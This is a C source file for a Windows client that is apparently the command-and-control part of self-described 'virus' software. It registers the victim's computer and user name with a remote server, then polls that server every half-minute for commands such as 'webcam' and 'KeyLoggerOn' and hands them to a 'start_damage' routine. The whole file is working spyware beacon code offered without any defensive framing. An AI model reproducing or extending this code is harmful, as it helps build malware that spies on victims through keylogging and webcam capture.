#include "Socket.h"

// main socket function conversation.
int start_socket()
{
    WSADATA wsaData = { 0 };
    struct sockaddr_in clientService = {0};
    SOCKET ConnectSocket = {0};
    char* data = NULL;
    int iResult = 0;

    
    // start the socket connection
    if (connect_socket(wsaData, clientService, &ConnectSocket) != 0)
    {
        printf("Problem starting the connection with the socket");
        return -1;
    }

    printf("Connected to server.\n"); // connected to the server -> with socket


    
    // sends first connection packet to the server
    if (send_first_commit_packet(&ConnectSocket) != 0)
    {
        printf("Problem sending first connection packet! \n");
        return -1;
    }

    // closing the socket connection
    if (close_socket(&ConnectSocket) != 0)
    {
        printf("Problem closing the socket connection! \n");
        return -1;
    }
    printf("socket closed correctly! \n");
    

    printf("\n---------------------------------\n");
    

    // temp strcpy!!!!!
    //strcpy(pc_name, "DESKTOP-TOSGN1S");
    
    while (1)
    {
        // start the socket connection
        iResult = connect_socket(wsaData, clientService, &ConnectSocket);
        if (iResult != 0)
        {
            printf("Problem starting the connection with the socket");
            return -1;
        }

        printf("Connected to server.\n"); // connected to the server -> with socket


        // every few minutes send the five minutes function to get commands.
        iResult = get_command(&ConnectSocket, &data);
        if (iResult != 0)
        {
            printf("Problem sending get command packet! \n");
            return -1;
        }

        // closing the socket connection
        iResult = close_socket(&ConnectSocket);
        if (iResult != 0)
        {
            printf("Problem closing the socket connection! \n");
            return -1;
        }

        printf("socket closed correctly! \n");

        printf("data in main func = %s \n", data);

        //if there are commands to do
        if (data != NULL)
        {
            printf("Commands to do! \n");
            
            // start using the damage functions. LOL
            iResult = start_damage(data);
            if (iResult != 0)
            {
                printf("Problem in the start damage function! \n");
                return -1;
            }

        }
        else
        {
            printf("No commands to do.");
        }
        free(data); // free the memory given
        data = NULL;



        
        /*
        if (/*some condition)
        {
            /* break outside the while loop 
        }
        */

        //Sleep(ONE_MIN_IN_MILISEC); // sleep for 1 minute
        Sleep(ONE_MIN_IN_MILISEC / 2); // temp Sleep.
    }


    



    return 0;
}



// Function to start the socket connection.
int connect_socket(WSADATA wsaData, struct sockaddr_in clientService, SOCKET* ConnectSocket)
{
    int iResult = 0;

    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
    if (iResult != NO_ERROR) {
        printf("WSAStartup function failed with error: %d\n", iResult);
        return -1;
    }


    *ConnectSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (*ConnectSocket == INVALID_SOCKET) {
        printf("socket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }


    clientService.sin_family = AF_INET;
    clientService.sin_addr.s_addr = inet_addr(SOCKET_IP);
    clientService.sin_port = htons(SOCKET_PORT);



    iResult = connect(*ConnectSocket, (SOCKADDR*)&clientService, sizeof(clientService));
    if (iResult == SOCKET_ERROR) {
        printf("connect function failed with error: %ld\n", WSAGetLastError());
        iResult = closesocket(*ConnectSocket);
        if (iResult == SOCKET_ERROR)
            printf("closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    return 0;
}


// This function closes the connection socket
int close_socket(SOCKET* ConnectSocket)
{
    int iResult = 0;

    // close the socket -> the connection
    iResult = closesocket(*ConnectSocket);
    if (iResult == SOCKET_ERROR) {
        printf("closesocket function failed with error: %ld\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    WSACleanup();
    return 0;
}



// delete at the finish project
// Example message for the first connection / commit function
/*
POST /first_connection HTTP/1.1\r\n
Connection: keep-alive\r\n
Accept: application/json\r\n\r\n

{{"pc_name": "{pc_name}","user_name": "{user_name}","day_of_month": "{day_of_month}"}}
*/

int send_first_commit_packet(SOCKET* s)
{
    int iResult = 0, buffer_size = MAX_COMPUTERNAME_LENGTH + 1, content_added_size = 0, temp_buffer_size = 0, msg_size = 0;
    PDWORD os_product_type = 0;
    char user_name[MAX_COMPUTERNAME_LENGTH + 1];
    SYSTEMTIME st;
    char* msg = NULL;
    char* content_added = NULL;
    char* temp_buffer = NULL;
    char* server_response = (char*) malloc(SIZE_OF_HTTP_MSG);
    //char* data = (char*) malloc(SIZE_OF_DATA);
    char* data = NULL;
    int msg_response_len = 0;
    HANDLE pc_file_handle = NULL;

    // getting the pc name -> global variable of the pc-name
    iResult = GetComputerNameA(pc_name, &buffer_size);
    
    // making a file named 'pc_name' that includes the pc name for the client uses.
    pc_file_handle = CreateFileA("pc_name.txt", GENERIC_WRITE, NULL, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);

    iResult = WriteFile(pc_file_handle, pc_name, strlen(pc_name), NULL, NULL);
    if (iResult == 0)
    {
        printf("Problem writing the pc_name file! \n");
        return -1;
    }

    // closing the handle to the 'pc_name' file.
    CloseHandle(pc_file_handle);

    // getting the user name
    iResult = GetUserName(user_name, &buffer_size);
    
    // getting the struct as the current time
    GetSystemTime(&st);

    temp_buffer_size = strlen("{%cpc_name%c: %c%s%c,%cuser_name%c: %c%s%c,%cday_of_month%c: %c%d%c}") + strlen(pc_name) + strlen(user_name) + sizeof(int) + 20;

    temp_buffer = (char*) malloc(temp_buffer_size);

    // content added
    snprintf(temp_buffer, temp_buffer_size, "{%cpc_name%c: %c%s%c,%cuser_name%c: %c%s%c,%cday_of_month%c: %c%d%c}", APOSTROPHES, APOSTROPHES, APOSTROPHES, pc_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, user_name, APOSTROPHES, APOSTROPHES, APOSTROPHES, APOSTROPHES, st.wDay,APOSTROPHES);

    // the real size of the content added
    content_added_size = strlen(temp_buffer);
    
    content_added = (char*) malloc(content_added_size + 1);
    
    snprintf(content_added, content_added_size + 1, temp_buffer); // '+ 1' to include the last letter -> need one more space for the null byte '\0'

    msg_size = strlen("%s\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n%s") + strlen(SOCKET_IP) + sizeof(SOCKET_PORT) + strlen(FIRST_CONNECTION_MSG) + strlen(content_added) + 20;

    // making the full http packet to send to the server
    msg = (char*)malloc(msg_size);


    // making the full POST message
    snprintf(msg , msg_size, "%s\r\nContent-Length: %d\r\nHost: %s:%d\r\n\r\n%s", FIRST_CONNECTION_MSG, content_added_size, SOCKET_IP, SOCKET_PORT, content_added);
    
    printf("\nmsg:\n'%s'\n", msg);


    // sending the first connection message
    iResult = send(
        *s,
        msg,
        strlen(msg),
        NULL
    );

    if (iResult == SOCKET_ERROR || iResult == 0)
    {
        printf("Problem sending the first connection message! \n");
        return -1;
    }
    


    // receiving the full message from the server
    iResult = recv(*s, server_response, SIZE_OF_HTTP_MSG, MSG_WAITALL);
    if (iResult > 0)
    {
        server_response[iResult] = '\0'; // adding the null byte
        printf("\nserver_response = %s\n", server_response);
        msg_response_len = iResult;
    }
    else if (iResult == SOCKET_ERROR || iResult == 0) // if error occurred
    {
        printf("Problem in recv msg from the first connection! ");
        return -1;
    }


    // parsing the http message to get the data given from the server
    data = get_data_from_http_msg(server_response, iResult);


    printf("\ntotal bytes received = %d \n", msg_response_len);

    // checking everything is ok -> the server got the first connection message / packet.
    if (strncmp(data, "true", sizeof("true")) != 0)
    {
        printf("Confirm message from server is not correct! \n");
        return -1;
    }


    free(msg);
    free(content_added);
    free(temp_buffer);
    free(server_response);
    free(data);


    return 0;
}


// delete at the finish project
// Example message for the getting command message every 5 minutes
/*
GET /command/{pc_name} HTTP/1.1
Connection: keep-alive
Accept: application/json
*/


int get_command(SOCKET* s, char** return_data)
{
    int iResult = 0, msg_len = 0;
    char* msg = NULL;
    char* data = NULL;


    msg_len = strlen(GET_COMMAND_MSG) + (MAX_COMPUTERNAME_LENGTH + 1) + strlen(SOCKET_IP) + sizeof(SOCKET_PORT);
    
    msg = (char*) malloc(msg_len);

    msg_len = snprintf(msg, msg_len, GET_COMMAND_MSG, pc_name, SOCKET_IP, SOCKET_PORT); // fixed / real len of the full message


    printf("msg = '%s' \n", msg);


    // sending the get command message
    iResult = send(
        *s,
        msg,
        strlen(msg),
        NULL
    );


    if (iResult == SOCKET_ERROR || iResult == 0)
    {
        printf("Problem sending the get command message! \n");
        return -1;
    }

    printf("%d bytes sent! \n", iResult);



    char buf[SIZE_OF_HTTP_MSG];
    // receiving the headers from the server
    iResult = recv(*s, buf, SIZE_OF_HTTP_MSG, MSG_WAITALL);
    if (iResult > 0)
    {
        buf[iResult] = '\0'; // adding the null byte
        printf("buf = %s\n", buf);
    }
    else
    {
        printf("Error getting the server respose in get command function! \n");
        return -1;
    }


    // parsing the http message to get the data given from the server
    data = get_data_from_http_msg(buf, iResult);

    // if there are commands to do
    if (strncmp(data, "false", strlen("false")) != 0)
    {
        // 'Returning' the data / commands to do
        *return_data = data;
    }


    free(msg);

    return 0;
}






/*HTTP / 1.0 200 OK
Content - Type: text / html; charset = utf - 8
Content - Length: 18
Server : Werkzeug / 1.0.1 Python / 3.8.1
Date : Thu, 30 Jul 2020 20 : 47 : 37 GMT

webcam\nKeyLoggerOn     // the data -> command for the virus //
*/


// NOT IN USE!!!!!!!

/*
struct MISSIONS* parse_http_packet(char* msg)
{
    int i = 0, j = 0, data_len = 0, missions_amount = 0, command_size = 0;
    char start_of_data[5] = { 0 };
    char* msg_ptr = msg; // another pointer to the message
    char* data = NULL;
    struct MISSIONS* missions = NULL;

    while (1) // getting the index of the start of the data in the message
    {
        strncpy(start_of_data, msg_ptr, sizeof(start_of_data));

        start_of_data[sizeof(start_of_data) - 1] = '\0'; // adding the null byte

        printf("startofdata = %s \n", start_of_data);

        if (strcmp(start_of_data, "\r\n\r\n") == 0) // end of headers -> start of data
        {
            i += 4; // to go to the start of the data
            break;
        }

        i++;
        msg_ptr++;
    }

    printf("i = %d \n", i);


    data_len = strlen(msg) - i;

    printf("data len = %d \n", data_len);

    data = (char*)malloc(data_len + 1);

    strncpy(data, (msg + i), data_len);

    data[data_len] = '\0'; // adding the null byte -> if i would have made the strncpy with the size of (data_len + 1) it would add automatically the '\0', it's more readable like this

    printf("data = %s \n", data);


    missions_amount = amount_of_missions(data);

    printf("amount_of_missions(data) = %d \n", missions_amount);


    missions = (struct MISSIONS*) malloc(missions_amount); // pointer to struct of arrays


    command_size = 0;
    i = 0;
    for (j = 0; j < data_len; j++)
    {
        command_size++;

        if (data[j] == '\n' || j == data_len - 1)
        {
            if (data[j] == '\n')
                strncpy(&(missions[i].command), data, command_size - 1); // to not include the '\n' char in the command
            else
                strncpy(&(missions[i].command), data, command_size); // if it's the last command, there is no '\n' char to miss

            missions[i].command[command_size] = '\0'; // adding the null byte


            data += command_size;
            i++;
            command_size = 0;
        }
    }

    for (i = 0; i < missions_amount; i++)
    {
        printf("Command = %s \n", missions[i].command);
    }


    free(data);


    return missions;
}
*/







// NOT IN USE!!!!!


// typical GET message for "/king"
/*

GET /king HTTP/1.1
Host: 127.0.0.1:5000
Connection: keep-alive
Accept: text/html

*/

/*char* parse_http_packet(char* msg)
{
    int i = 4, command_len = 0; // after 'GET ' there is the start of the path asked

    while (1)
    {
        if (msg[i] == 'H' && msg[i + 1] == 'T' && msg[i + 2] == 'T' && msg[i + 3] == 'P') // if we got to "HTTP" - we nee to stop searching 
            break;
        
        i++;

        command_len++;
    }

    char* command = (char*) malloc(command_len);

    msg += i - command_len; // making the msg ptr to point to the command

    strncpy(command, msg, command_len); // getting the command

    command[command_len - 1] = '\0'; // adding the null byte

    printf("command = %s ", command);

    return command;
}*/